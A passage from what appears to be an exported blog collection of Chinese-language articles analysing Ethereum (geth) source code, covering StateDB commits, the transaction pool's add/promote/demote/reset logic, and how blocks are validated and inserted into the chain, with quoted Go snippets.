{\n\t\tobj, exist := s.stateObjects[addr]\n\t\tif !exist {\n\t\t\tcontinue\n\t\t}\n\t\tif obj.suicided || (deleteEmptyObjects &amp;&amp; obj.empty()) {\n\t\t\tobj.deleted = true\n\t\t} else {\n\t\t\tobj.finalise()\n\t\t}\n\t\ts.stateObjectsPending[addr] = struct{}{}\n\t\ts.stateObjectsDirty[addr] = struct{}{}\n\t}\n\ts.clearJournalAndRefund()\n}\n其实这个跟state_object的finalise方法是一个方式，底层就是调用了obj.finalise将dirty状态的所有数据全部推入到pending中去，等待处理。\n②：处理stateObjectsPending中的数据\n先更新账户的Root根，然后再将将给定的对象写入trie。\nfor addr := range s.stateObjectsPending {\n\t\tobj := s.stateObjects[addr]\n\t\tif obj.deleted {\n\t\t\ts.deleteStateObject(obj)\n\t\t} else {\n\t\t\tobj.updateRoot(s.db)\n\t\t\ts.updateStateObject(obj)\n\t\t}\n\t}\n将状态写入底层内存Trie数据库\n这部分功能由commit方法完成。\n\n计算状态Trie的当前根哈希\n将状态对象中的所有更改写入到存储树\n\n第一步在上面已经讲过了，第二步的内容如下：\nfor addr := range s.stateObjectsDirty {\n\t\tif obj := s.stateObjects[addr]; !obj.deleted {\n\t\t\t....\n\t\t\tif err := obj.CommitTrie(s.db); err != nil {\n\t\t\t\treturn common.Hash{}, err\n\t\t\t}\n\t\t}\n\t}\n核心就是objectCommitTrie,这也是上面state_object的内容。\n总结流程如下：\n\n1.IntermediateRoot\n2.CommitTrie→updateTrie→trie.Commit→trie.db.insertPreimage(已经有了直接持久化到硬盘数据库)\n​\t\t\t\t\t\t\t\t\t\t\t\t\t\t  →t.trie.Commit（没有就提交到存储树中）\n\n最后看一下以太坊数据库的读写过程：\n\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide\nwww.jianshu.com/p/20d7f7c37b03\nhackernoon.com/getting-deep-into-ethereum-how-data-is-stored-in-ethereum-e3f669d96033\nweb.xidian.edu.cn/qqpei/files/Blockchain/4_Data.pdf\nwww.ltk100.com/article-112-1.html\nlearnblockchain.cn/books/geth/part3/statedb.html\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之trie-15":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之trie-15","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之trie-15.md","title":"死磕以太坊源码分析之trie-15","links":[],"tags":[],"content":"\n死磕以太坊源码分析之Trie树\n配合以下代码进行阅读：github.com/blockchainGuide/\n希望读者在阅读过程中发现问题可以及时评论哦，大家一起进步。\n\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之txpool-12":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之txpool-12","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之txpool-12.md","title":"死磕以太坊源码分析之txpool-12","links":[],"tags":[],"content":"\n死磕以太坊源码分析之txpool\n请结合以下代码阅读:github.com/blockchainGuide/\n写文章不易，也希望大家多多指出问题\n\n交易池概念原理\n交易池工作概况：\n\n\n交易池的数据来源主要来自：\n\n本地提交，也就是第三方应用通过调用本地以太坊节点的RPC服务所提交的交易；\n远程同步，是指通过广播同步的形式，将其他以太坊节点的交易数据同步至本地节点;\n\n\n交易池中交易去向：被Miner模块获取并验证，用于挖矿；挖矿成功后写进区块并被广播\nMiner取走交易是复制，交易池中的交易并不减少。直到交易被写进规范链后才从交易池删除；\n交易如果被写进分叉，交易池中的交易也不减少，等待重新打包。\n\n关键数据结构\nTxPoolConfig\ntype TxPoolConfig struct {\n\tLocals    []common.Address // 本地账户地址存放\n\tNoLocals  bool             // 是否开启本地交易机制\n\tJournal   string           // 本地交易存放路径\n\tRejournal time.Duration    // 持久化本地交易的间隔\n\tPriceLimit uint64         // 价格超出比例，若想覆盖一笔交易的时候，若价格上涨比例达不到要求，那么不能覆盖\n\tPriceBump  uint64 // 替换现有交易的最低价格涨幅百分比（一次）\n\tAccountSlots uint64 // 每个账户的可执行交易限制\n\tGlobalSlots  uint64 // 全部账户最大可执行交易\n\tAccountQueue uint64 // 单个账户不可执行的交易限制\n\tGlobalQueue  uint64 // 全部账户最大非执行交易限制\n\tLifetime time.Duration // 一个账户在queue中的交易可以存活的时间\n}\n默认配置：\n\nJournal:   &quot;transactions.rlp&quot;,\nRejournal: time.Hour,\n \nPriceLimit: 1,\nPriceBump:  10,\n \nAccountSlots: 16,\nGlobalSlots:  4096,\nAccountQueue: 64,\nGlobalQueue:  1024,\n \nLifetime: 3 * time.Hour\n\nTxPool\ntype TxPool struct {\n\tconfig      TxPoolConfig // 交易池配置\n\tchainconfig *params.ChainConfig // 区块链配置\n\tchain       blockChain // 定义blockchain接口\n\tgasPrice    *big.Int\n\ttxFeed      event.Feed //时间流\n\tscope       event.SubscriptionScope // 订阅范围\n\tsigner      types.Signer //签名\n\tmu          sync.RWMutex\n \n\tistanbul bool // Fork indicator whether we are in the istanbul stage.\n \n\tcurrentState  *state.StateDB // 当前头区块对应的状态\n\tpendingNonces *txNoncer      // Pending state tracking virtual nonces\n\tcurrentMaxGas uint64         // Current gas limit for transaction caps\n \n\tlocals  *accountSet // Set of local transaction to exempt from eviction rules\n\tjournal *txJournal  // Journal of local transaction to back up to disk\n \n\tpending map[common.Address]*txList   // All currently processable transactions\n\tqueue   map[common.Address]*txList   // Queued but non-processable transactions\n\tbeats   map[common.Address]time.Time // Last heartbeat from each known account\n\tall     *txLookup                    // All transactions to allow lookups\n\tpriced  *txPricedList                // All transactions sorted by price\n \n\tchainHeadCh     chan ChainHeadEvent\n\tchainHeadSub    event.Subscription\n\treqResetCh      chan *txpoolResetRequest\n\treqPromoteCh    chan *accountSet\n\tqueueTxEventCh  chan *types.Transaction\n\treorgDoneCh     chan chan struct{}\n\treorgShutdownCh chan struct{}  // requests shutdown of scheduleReorgLoop\n\twg              sync.WaitGroup // tracks loop, scheduleReorgLoop\n}\n \ntxpool初始化\nTxpool初始化主要做了以下几件事：\n①：检查配置  配置有问题则用默认值填充\n   config = (&amp;config).sanitize()\n对于这部分的检查查看TxPoolConfig的字段。\n②：初始化本地账户\n   pool.locals = newAccountSet(pool.signer)\n③：将配置的本地账户地址加到交易池\n   pool.locals.add(addr)\n我们在安装以太坊客户端可以指定一个数据存储目录，此目录便会存储着所有我们导入的或者通过本地客户端创建的帐户keystore文件。而这个加载过程便是从该目录加载帐户数据\n④：更新交易池\n   pool.reset(nil, chain.CurrentBlock().Header())\n⑤：创建所有交易存储的列表，所有交易的价格用最小堆存放\n   pool.priced = newTxPricedList(pool.all)\n通过排序，优先处理gasprice越高的交易。\n⑥：如果本地交易开启 那么从本地磁盘加载本地交易\n   if !config.NoLocals &amp;&amp; config.Journal != &quot;&quot; {\n   \t\tpool.journal = newTxJournal(config.Journal)\n   \n   \t\tif err := pool.journal.load(pool.AddLocals); err != nil {\n   \t\t\tlog.Warn(&quot;Failed to load transaction journal&quot;, &quot;err&quot;, err)\n   \t\t}\n   \t\tif err := pool.journal.rotate(pool.local()); err != nil {\n   \t\t\tlog.Warn(&quot;Failed to rotate transaction journal&quot;, &quot;err&quot;, err)\n   \t\t}\n   \t}\n⑦：订阅链上事件消息\n   pool.chainHeadSub = pool.chain.SubscribeChainHeadEvent(pool.chainHeadCh)\n⑧：开启主循环\n   go pool.loop()\n\n注意：local交易比remote交易具有更高的权限，一是不轻易被替换；二是持久化，即通过一个本地的journal文件保存尚未打包的local交易。所以在节点启动的时候，优先从本地加载local交易。\n本地地址会被加入白名单，凡由此地址发送的交易均被认为是local交易，不论是从本地递交还是从远端发送来的。\n\n到此为止交易池加载过程结束。\n添加交易到txpool\n之前我们说过交易池中交易的来源一方面是其他节点广播过来的，一方面是本地提交的，追根到源代码一个是AddLocal，一个是AddRemote,不管哪个都会调用addTxs。我们对添加交易的讨论就会从这个函数开始，它主要做了以下几件事,先用一张简图说明一下：\n\n\n\n过滤池中已经存在的交易\nif pool.all.Get(tx.Hash()) != nil {\n  errs[i] = fmt.Errorf(&quot;known transaction: %x&quot;, tx.Hash())\n\t\t\tknownTxMeter.Mark(1)\n\t\t\tcontinue\n\t\t}\n\n\n将交易添加到队列中\nnewErrs, dirtyAddrs := pool.addTxsLocked(news, local)\n进入到addTxsLocked函数中：\nreplaced, err := pool.add(tx, local)\n进入到 pool.add函数中，这个add函数相当重要，它是将交易添加到queue中，等待后面的promote，到pending中去。如果在queue或者pending中已经存在，并且它的gas price更高时，将覆盖之前的交易。下面来拆开的分析一下add 这个函数。\n①：看交易是否收到过，如果已经收到过就丢弃\nif pool.all.Get(hash) != nil {\n\t\tlog.Trace(&quot;Discarding already known transaction&quot;, &quot;hash&quot;, hash)\n\t\tknownTxMeter.Mark(1)\n\t\treturn false, fmt.Errorf(&quot;known transaction: %x&quot;, hash)\n\t}\n②：如果交易没通过验证也要丢弃，这里的重点是验证函数：\nvalidateTx: 主要做了以下几件事\n- 交易大小不能超过32kb\n- 交易金额不能为负\n- 交易gas值不能超出当前交易池设定的gaslimit\n- 交易签名必须正确\n- 如果交易为远程交易，则需验证其gasprice是否小于交易池gasprice最小值，如果是本地，优先打包，不管gasprice\n- 判断当前交易nonce值是否过低\n- 交易所需花费的转帐手续费是否大于帐户余额  cost == V + GP * GL\n- 判断交易花费gas是否小于其预估花费gas\n③：如果交易池已满，丢弃价格过低的交易\nif uint64(pool.all.Count()) &gt;= pool.config.GlobalSlots+pool.config.GlobalQueue {\n\t\tif !local &amp;&amp; pool.priced.Underpriced(tx, pool.locals) {\n\t\t\t...\n\t\t}\n\t\tdrop := pool.priced.Discard(pool.all.Count()-int(pool.config.GlobalSlots+pool.config.GlobalQueue-1), pool.locals)\n\t\tfor _, tx := range drop {\n\t\t\t...\n\t\t\tpool.removeTx(tx.Hash(), false)\n\t\t}\n\t}\n注意这边的GlobalSlots和GlobalQueue ，就是我们说的pending和queue的最大容量，如果交易池的交易数超过两者之和，就要丢弃价格过低的交易。\n\n\n④：判断当前交易在pending队列中是否存在nonce值相同的交易。存在则判断当前交易所设置的gasprice是否超过设置的PriceBump百分比，超过则替换覆盖已存在的交易，否则报错返回替换交易gasprice过低，并且把它扔到queue队列中(enqueueTx)。\n   if list := pool.pending[from]; list != nil &amp;&amp; list.Overlaps(tx) {\n\t\t// Nonce already pending, check if required price bump is met\n   \t\tinserted, old := list.Add(tx, pool.config.PriceBump)\n\t\tif !inserted {\n   \t\t\tpendingDiscardMeter.Mark(1)\n   \t\t\treturn false, ErrReplaceUnderpriced\n   \t\t}\n   \t\t// New transaction is better, replace old one\n   \t\tif old != nil {\n   \t\t\tpool.all.Remove(old.Hash())\n   \t\t\tpool.priced.Removed(1)\n   \t\t\tpendingReplaceMeter.Mark(1)\n   \t\t}\n   \t\tpool.all.Add(tx)\n   \t\tpool.priced.Put(tx)\n   \t\tpool.journalTx(from, tx)\n   \t\tpool.queueTxEvent(tx)\n   \t\tlog.Trace(&quot;Pooled new executable transaction&quot;, &quot;hash&quot;, hash, &quot;from&quot;, from, &quot;to&quot;, tx.To())\n   \t\treturn old != nil, nil\n   \t}\n   \t// New transaction isn&#039;t replacing a pending one, push into queue\n   \treplaced, err = pool.enqueueTx(hash, tx)\n添加交易的流程就到此为止了。接下来就是如何把queue（暂时不可执行）中添加的交易扔到pending（可执行交易）中，速成promote。\n\n\n提升交易\n提升交易主要把交易从queue扔到pending中，我们在接下来的里面重点讲\ndone := pool.requestPromoteExecutables(dirtyAddrs)\n\n\n交易升级\npromoteExecutables将future queue中的交易移动到pending中，同时也会删除很多无效交易比如nonce低或者余额低等等，主要分以下步骤：先看张图：\n\n①：将所有queue中nonce低于账户当前nonce的交易从all里面删除\nforwards := list.Forward(pool.currentState.GetNonce(addr))\n\t\tfor _, tx := range forwards {\n\t\t\thash := tx.Hash()\n\t\t\tpool.all.Remove(hash)\n\t\t\tlog.Trace(&quot;Removed old queued transaction&quot;, &quot;hash&quot;, hash)\n\t\t}\n②：将所有queue中花费大于账户余额 或者gas大于限制的交易从all里面删除\ndrops, _ := list.Filter(pool.currentState.GetBalance(addr), pool.currentMaxGas)\n\t\tfor _, tx := range drops {\n\t\t\thash := tx.Hash()\n\t\t\tpool.all.Remove(hash)\n\t\t\tlog.Trace(&quot;Removed unpayable queued transaction&quot;, &quot;hash&quot;, hash)\n\t\t}\n③：将所有可执行的交易从queue里面移到pending里面（proteTx）\n注：可执行交易：将pending里面nonce值大于等于账户当前状态nonce的，且nonce连续的几笔交易作为准备好的交易\nreadies := list.Ready(pool.pendingNonces.get(addr))\n\t\tfor _, tx := range readies {\n\t\t\thash := tx.Hash()\n\t\t\tif pool.promoteTx(addr, hash, tx) {\n\t\t\t\tlog.Trace(&quot;Promoting queued transaction&quot;, &quot;hash&quot;, hash)\n\t\t\t\tpromoted = append(promoted, tx)\n\t\t\t}\n\t\t}\n重点就是 promoteTx的处理，这个方法与add的不同之处在于，addTx是获得到的新交易插入pending，而promoteTx是将queue列表中的Txs放入pending接下来我们先看看里面是如何来处理的：\ninserted, old := list.Add(tx, pool.config.PriceBump)\n\tif !inserted {\n\t\t// An older transaction was better, discard this\n\t\t// 老的交易更好，删除这个交易\n\t\tpool.all.Remove(hash)\n\t\tpool.priced.Removed(1)\n \n\t\tpendingDiscardMeter.Mark(1)\n\t\treturn false\n\t}\n\t// Otherwise discard any previous transaction and mark this\n\t// 现在这个交易更好，删除旧的交易\n\tif old != nil {\n\t\tpool.all.Remove(old.Hash())\n\t\tpool.priced.Removed(1)\n \n\t\tpendingReplaceMeter.Mark(1)\n\t} else {\n\t...\n\t}\n主要就做了这几件事：\n\n将交易插入pending中，如果待插入的交易nonce在pending列表中存在，那么待插入的交易gas price大于或等于原交易价值的110%（跟pricebump设定有关）时，替换原交易\n如果新交易替换了某个交易，从all列表中删除老交易\n最后更新一下all列表\n\n经过proteTx之后，要扔到pending的交易都放在了promoted []*types.Transaction中，再回到promoteExecutables中，继续下面步骤：\n④：如果非本地账户queue大于限制（AccountQueue），从最后取出nonce较大的交易进行remove\nif !pool.locals.contains(addr) {\n\t\t\tcaps = list.Cap(int(pool.config.AccountQueue))\n\t\t\tfor _, tx := range caps {\n\t\t\t\thash := tx.Hash()\n\t\t\t\tpool.all.Remove(hash)\n\t\t\t...\n\t\t}\n⑤：最后如果队列中此账户的交易为空则删除此账户\nif list.Empty() {\n\t\t\tdelete(pool.queue, addr)\n\t\t}\n到此我们的升级交易要做的事情就完毕了。\n\n交易降级\n交易降级的几个场景：\n\n出现了新的区块，将会从pending中移除出现在区块中的交易到queue中\n或者是另外一笔交易（gas price 更高）,则会从pending中移除到queue中\n\n关键函数：demoteUnexecutables，主要做的事情如下：\n①：遍历pending中所有地址对应的交易列表\nfor addr, list := range pool.pending {\n  ...}\n②：删除所有认为过旧的交易（low nonce）\nolds := list.Forward(nonce)\n\t\tfor _, tx := range olds {\n\t\t\thash := tx.Hash()\n\t\t\tpool.all.Remove(hash)\n\t\t\tlog.Trace(&quot;Removed old pending transaction&quot;, &quot;hash&quot;, hash)\n\t\t}\n③：删除所有费用过高的交易（余额低或用尽），并将所有无效者送到queue中以备后用\ndrops, invalids := list.Filter(pool.currentState.GetBalance(addr), pool.currentMaxGas)\n\t\tfor _, tx := range drops {\n\t\t\thash := tx.Hash()\n\t\t\tlog.Trace(&quot;Removed unpayable pending transaction&quot;, &quot;hash&quot;, hash)\n\t\t\tpool.all.Remove(hash)\n\t\t}\n\t\tpool.priced.Removed(len(olds) + len(drops))\n\t\tpendingNofundsMeter.Mark(int64(len(drops)))\n \n\t\tfor _, tx := range invalids {\n\t\t\thash := tx.Hash()\n\t\t\tlog.Trace(&quot;Demoting pending transaction&quot;, &quot;hash&quot;, hash)\n\t\t\tpool.enqueueTx(hash, tx)\n\t\t}\n④：如果交易前面有间隙，将后面的交易移到queue中\nif list.Len() &gt; 0 &amp;&amp; list.txs.Get(nonce) == nil {\n\t\t\tgapped := list.Cap(0)\n\t\t\tfor _, tx := range gapped {\n\t\t\t\thash := tx.Hash()\n\t\t\t\tlog.Error(&quot;Demoting invalidated transaction&quot;, &quot;hash&quot;, hash)\n\t\t\t\tpool.enqueueTx(hash, tx)\n\t\t\t}\n\t\t\tpendingGauge.Dec(int64(len(gapped)))\n\t\t}\n注：间隙的出现通常是因为交易余额问题导致的。假如原规范链 A 上交易m花费10，分叉后该账户又在分叉链B发出一个交易m花费20，这就导致该账户余额本来可以支付A链上的某笔交易，但在B链上可能就不够了。这个余额不足的交易在B如果是n+3，那么在A链上n+2，n+4号交易之间就出现了空隙，这就导致从n+3开始往后所有的交易都要降级；\n到此为止交易降级结束。\n\n重置交易池\n\n重置交易池将检索区块链的当前状态（主要由于更新导致链状态变化），并确保交易池的内容对于链状态而言是有效的。\nreset的调用时机如下：\n\nTxPool初始化的过程：NewTxPool；\nTxPool事件监听go程收到规范链更新事件\n\n流程图如下：\n\n根据上面流程图，主要功能是由于规范链的更新，重新整理交易池：\n①：如果老区块头不为空 且老区块头不是新区块的父区块，说明新老区块不在一条链上\nif oldHead != nil &amp;&amp; oldHead.Hash() != newHead.ParentHash {}\n②：如果新头区块和旧头区块相差大于64，则所有交易不必回退到交易池\nif depth := uint64(math.Abs(float64(oldNum) - float64(newNum))); depth &gt; 64 {\n  log.Debug(&quot;Skipping deep transaction reorg&quot;, &quot;depth&quot;, depth)\n}\n③：如果旧链的头区块大于新链的头区块高度，旧链向后退并回收所有回退的交易\nfor rem.NumberU64() &gt; add.NumberU64() {\n\t\t\t\tdiscarded = append(discarded, rem.Transactions()...)\n\t\t\t\tif rem = pool.chain.GetBlock(rem.ParentHash(), rem.NumberU64()-1); rem == nil {\n\t\t\t\t\tlog.Error(&quot;Unrooted old chain seen by tx pool&quot;, &quot;block&quot;, oldHead.Number, &quot;hash&quot;, oldHead.Hash())\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n④：如果新链的头区块大于旧链的头区块，新链后退并回收交易\nfor add.NumberU64() &gt; rem.NumberU64() {\n\t\t\t\tincluded = append(included, add.Transactions()...)\n\t\t\t\tif add = pool.chain.GetBlock(add.ParentHash(), add.NumberU64()-1); add == nil {\n\t\t\t\t\tlog.Error(&quot;Unrooted new chain seen by tx pool&quot;, &quot;block&quot;, newHead.Number, &quot;hash&quot;, newHead.Hash())\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n⑤：当新旧链到达同一高度的时候同时回退，知道找到共同的父节点\nfor rem.Hash() != add.Hash() {\n\t\t\t\tdiscarded = append(discarded, rem.Transactions()...)\n\t\t\t\tif rem = pool.chain.GetBlock(rem.ParentHash(), rem.NumberU64()-1); rem == nil {\n\t\t\t\t\tlog.Error(&quot;Unrooted old chain seen by tx pool&quot;, &quot;block&quot;, oldHead.Number, &quot;hash&quot;, oldHead.Hash())\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t\tincluded = append(included, add.Transactions()...)\n\t\t\t\tif add = pool.chain.GetBlock(add.ParentHash(), add.NumberU64()-1); add == nil {\n\t\t\t\t\tlog.Error(&quot;Unrooted new chain seen by tx pool&quot;, &quot;block&quot;, newHead.Number, &quot;hash&quot;, newHead.Hash())\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t} \n⑥：给交易池设置最新的世界状态\nstatedb, err := pool.chain.StateAt(newHead.Root)\n\tif err != nil {\n\t\tlog.Error(&quot;Failed to reset txpool state&quot;, &quot;err&quot;, err)\n\t\treturn\n\t}\n\tpool.currentState = statedb\n\tpool.pendingNonces = newTxNoncer(statedb)\n\tpool.currentMaxGas = newHead.GasLimit\n⑦：把旧链回退的交易放入交易池\nsenderCacher.recover(pool.signer, reinject)\npool.addTxsLocked(reinject, false)\n到此整个reset的流程就结束了。\n\n\n参考：\nmindcarver.cn/\ngithub.com/mindcarver/blockchain_guide\nlearnblockchain.cn/2019/06/03/eth-txpool/#%E6%B8%85%E7%90%86%E4%BA%A4%E6%98%93%E6%B1%A0\nblog.csdn.net/lj900911/article/details/84825739\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之区块上链入库-10":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之区块上链入库-10","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之区块上链入库-10.md","title":"死磕以太坊源码分析之区块上链入库-10","links":[],"tags":[],"content":"\n死磕以太坊源码分析之区块上链入库\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n引言\n不管是矿工挖矿还是Fetcher同步，Downloader同步，或者是导入本地文件等等，最中都是将区块上链入库。接下来我们就详细分析这部分的动作。\n几处可能调用的地方\n①：在Downloader同步最后会将区块插入到区块链中\nfunc (d *Downloader) importBlockResults(results []*fetchResult) error {\n  ...\n  if index, err := d.blockchain.InsertChain(blocks); err != nil {\n    ....\n  }\n}\n②：创建一个新的以太坊协议管理器，也会将区块插入到链中\nfunc NewProtocolManager(...) (*ProtocolManager, error) {\n  ...\n  n, err := manager.blockchain.InsertChain(blocks)\n}\n③：插入侧链数据\nfunc (bc *BlockChain) insertSideChain(block *types.Block, it *insertIterator) (int, error) {\n  ...\n  if _, err := bc.insertChain(blocks, false); err != nil {\n    ....\n  }\n}\n④：从本地文件导入链\nfunc (api *PrivateAdminAPI) ImportChain(file string) (bool, error) {\n  if _, err := api.eth.BlockChain().InsertChain(blocks); err != nil {\n    ....\n  }\n}\n⑤：fetcher同步导入块\nfunc (f *Fetcher) insert(peer string, block *types.Block) {\n...\n  if _, err := f.insertChain(types.Blocks{block}); err != nil {\n    ...\n  }\n}\n以上就是比较常见的需要将区块上链的动作。调用的核心方法就是：\nfunc (bc *BlockChain) insertChain(chain types.Blocks, verifySeals bool) (int, error) {}\n\n\n获取区块链所有相关文章以及资料，请参阅：github.com/blockchainGuide/\n\n插入数据到blockchain中\n①：如果链正在中断，直接返回\nif atomic.LoadInt32(&amp;bc.procInterrupt) == 1 {\n\t\treturn 0, nil\n\t}\n②：开启并行的签名恢复\n\tsenderCacher.recoverFromBlocks(types.MakeSigner(bc.chainConfig, chain[0].Number()), chain)\n③：开启并行校验header\nabort, results := bc.engine.VerifyHeaders(bc, headers, seals)\n校验header是共识引擎所要做的事情，我们这里只分析ethash它的实现。\nfunc (ethash *Ethash) VerifyHeaders(chain consensus.ChainReader, headers []*types.Header, seals []bool) (chan&lt;- struct{}, &lt;-chan error) {\n  ....\n  errors[index] = ethash.verifyHeaderWorker(chain, headers, seals, index)\n}\nfunc (ethash *Ethash) verifyHeaderWorker(chain consensus.ChainReader, headers []*types.Header, seals []bool, index int) error {\n\tvar parent *types.Header\n\tif index == 0 {\n\t\tparent = chain.GetHeader(headers[0].ParentHash, headers[0].Number.Uint64()-1)\n\t} else if headers[index-1].Hash() == headers[index].ParentHash {\n\t\tparent = headers[index-1]\n\t}\n\tif parent == nil {\n\t\treturn consensus.ErrUnknownAncestor\n\t}\n\tif chain.GetHeader(headers[index].Hash(), headers[index].Number.Uint64()) != nil {\n\t\treturn nil // known block\n\t}\n\treturn ethash.verifyHeader(chain, headers[index], parent, false, seals[index])\n}\n首先会调用verifyHeaderWorker进行校验，主要检验块的祖先是否已知以及块是否已知，接着会调用verifyHeader进行更深的校验，也是最核心的校验，大概做了以下几件事：\n\nheader.Extra不可超过32字节\nheader.Time不能超过15秒，15秒以后的就被认定为未来的块\n当前header的时间戳不可以等于父块的时间戳\n根据难度计算算法得出的expected必须和header.Difficulty 一致。\nGas limit 要 ⇐ 2 ^ 63-1\ngasUsed⇐ gasLimit\nGas limit 要在允许范围内\n块号必须是父块加1\n根据 ethash.VerifySeal去验证块是否满足POW难度要求\n\n到此验证header的事情就做完了。\n④：循环校验body\nblock, err := it.next()\n\t-&gt; ValidateBody\n\t\t-&gt; VerifyUncles\n包括以下错误：\n\nblock已知\nuncle太多\n重复的uncle\nuncle是祖先块\nuncle哈希不匹配\n交易哈希不匹配\n未知祖先\n祖先块的状态无法获取\n\n4.1 如果block存在，且是已知块，则写入已知块。\nbc.writeKnownBlock(block)\n4.2 如果是祖先块的状态无法获取的错误，则作为侧链插入：\nbc.insertSideChain(block, it)\n4.3 如果是未来块或者未知祖先，则添加未来块：\nbc.addFutureBlock(block);\n注意这里的添加 futureBlock，会被扔进futureBlocks里面去，在NewBlockChain的时候会开启新的goroutine:\ngo bc.update()\nfunc (bc *BlockChain) update() {\n  futureTimer := time.NewTicker(5 * time.Second)\n  for{\n    select{\n      case &lt;-futureTimer.C:\n\t\t\tbc.procFutureBlocks()\n    }\n  }\n}\nfunc (bc *BlockChain) procFutureBlocks() {\n  ...\n\tfor _, hash := range bc.futureBlocks.Keys() {\n\t\tif block, exist := bc.futureBlocks.Peek(hash); exist {\n\t\t\tblocks = append(blocks, block.(*types.Block))\n\t\t}\n\t}\n...\n\t\tfor i := range blocks {\n\t\t\tbc.InsertChain(blocks[i : i+1])\n\t\t}\n\t}\n}\n会开启一个计时器，每5秒就会去执行插入这些未来的块。\n4.4 如果是其他错误，直接中断，并且报告坏块。\nbc.futureBlocks.Remove(block.Hash())\n...\nbc.reportBlock(block, nil, err)\n⑤：没有校验错误\n5.1 如果是坏块，则报告；\nif BadHashes[block.Hash()] {\n\t\t\tbc.reportBlock(block, nil, ErrBlacklistedHash)\n\t\t\treturn it.index, ErrBlacklistedHash\n\t\t}\n5.2 如果是未知块，则写入未知块；\nif err == ErrKnownBlock {\n\t\t\tlogger := log.Debug\n\t\t\tif bc.chainConfig.Clique == nil {\n\t\t\t\tlogger = log.Warn\n\t\t\t}\n\t\t...\n\t\t\tif err := bc.writeKnownBlock(block); err != nil {\n\t\t\t\treturn it.index, err\n\t\t\t}\n\t\t\tstats.processed++\n\t\t\tlastCanon = block\n\t\t\tcontinue\n\t\t}\n5.3 根据给定trie，创建状态；\nparent := it.previous()\n\t\tif parent == nil {\n\t\t\tparent = bc.GetHeader(block.ParentHash(), block.NumberU64()-1)\n\t\t}\n\t\tstatedb, err := state.New(parent.Root, bc.stateCache)\n5.4执行块中的交易： (稍后会在下节对此进行详细分析)\nreceipts, logs, usedGas, err := bc.processor.Process(block, statedb, bc.vmConfig)\n5.5 使用默认的validator校验状态：\nbc.validator.ValidateState(block, statedb, receipts, usedGas);\n5.6 将块写入到区块链中并获取状态：  (稍后会在下节对此进行详细分析)\nstatus, err := bc.writeBlockWithState(block, receipts, logs, statedb, false)\n⑥：校验写入区块的状态\n\nCanonStatTy ： 插入成功新的block\nSideStatTy：插入成功新的分叉区块\nDefault：插入未知状态的block\n\n⑦：如果还有块，并且是未来块的话，那么将块添加到未来块的缓存中去\nbc.addFutureBlock(block)\n至此insertChain 大概介绍清楚。\n\n执行块中交易\n在我们将区块上链，有一个关键步骤就是执行区块交易：\nreceipts, logs, usedGas, err := bc.processor.Process(block, statedb, bc.vmConfig)\n进入函数，具体分析：\n①：准备要用的字段，循环执行交易\n关键函数：ApplyTransaction,根据此函数返回收据。\n1.1 将交易结构转成Message结构\nmsg, err := tx.AsMessage(types.MakeSigner(config, header.Number))\n1.2 创建要在EVM环境中使用的新上下文\ncontext := NewEVMContext(msg, header, bc, author)\n1.3 创建一个新环境，其中包含有关事务和调用机制的所有相关信息。\nvmenv := vm.NewEVM(context, statedb, config, cfg)\n1.4 将交易应用到当前状态(包含在env中)\n_, gas, failed, err := ApplyMessage(vmenv, msg, gp)\n这部分代码继续跟进：\nfunc ApplyMessage(evm *vm.EVM, msg Message, gp *GasPool) ([]byte, uint64, bool, error) {\n\treturn NewStateTransition(evm, msg, gp).TransitionDb()\n}\nNewStateTransition 是一个状态转换对象，TransitionDb() 负责转换交易状态，继续跟进：\n先进行preCheck，用来校验nonce是否正确\nst.preCheck()\n \nif st.msg.CheckNonce() {\n\t\tnonce := st.state.GetNonce(st.msg.From())\n\t\tif nonce &lt; st.msg.Nonce() {\n\t\t\treturn ErrNonceTooHigh\n\t\t} else if nonce &gt; st.msg.Nonce() {\n\t\t\treturn ErrNonceTooLow\n\t\t}\n\t}\n计算所需gas：\ngas, err := IntrinsicGas(st.data, contractCreation, homestead, istanbul)\n扣除gas：\nif err = st.useGas(gas); err != nil {\n\t\treturn nil, 0, false, err\n\t}\nfunc (st *StateTransition) useGas(amount uint64) error {\n\tif st.gas &lt; amount {\n\t\treturn vm.ErrOutOfGas\n\t}\n\tst.gas -= amount\n\treturn nil\n}\n如果是合约交易,则新建一个合约\nret, _, st.gas, vmerr = evm.Create(sender, st.data, st.gas, st.value)\n如果不是合约交易，则增加nonce\nst.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+1)\nret, st.gas, vmerr = evm.Call(sender, st.to(), st.data, st.gas, st.value)\n重点关注evm.call方法：\n检查账户是否有足够的气体进行转账\nif !evm.Context.CanTransfer(evm.StateDB, caller.Address(), value) {\n\t\treturn nil, gas, ErrInsufficientBalance\n\t}\n如果stateDb不存在此账户，则新建账户\nif !evm.StateDB.Exist(addr) {\n  evm.StateDB.CreateAccount(addr)\n}\n执行转账操作\nevm.Transfer(evm.StateDB, caller.Address(), to.Address(), value)\n创建合约\ncontract := NewContract(caller, to, value, gas)\n执行合约\nret, err = run(evm, contract, input, false)\n添加余额\n\tst.state.AddBalance(st.evm.Coinbase, 